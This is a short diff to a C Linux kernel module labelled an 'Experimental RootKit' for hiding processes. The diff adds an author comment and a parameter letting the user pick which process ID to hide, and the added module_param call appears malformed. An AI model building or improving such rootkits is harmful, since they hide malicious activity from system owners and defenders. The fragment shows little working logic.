@@ -1,4 +1,4 @@
-/*
+/*#### IMPROVED BY ME WILLIAM MARTENS 2020 TO LET USER CHOOSE WHICH PROCESS ID TO HIDE AS WELL AS SOME COMMENTS #### 
  * Experimental RootKit
  * Simple RootKit for the EARL project
  * Functionality : Hiding processes
@@ -19,6 +19,8 @@ module_init(phide_init);
 module_exit(phide_exit);
 
 static char *proc_to_hide = "1";
+module_param(proc_to_hide); // IMPROVEMENT TAKES PALCE HERE
+
 static struct file_operations proc_fops;
 static struct file_operations *backup_proc_fops;
 static struct inode *proc_inode;
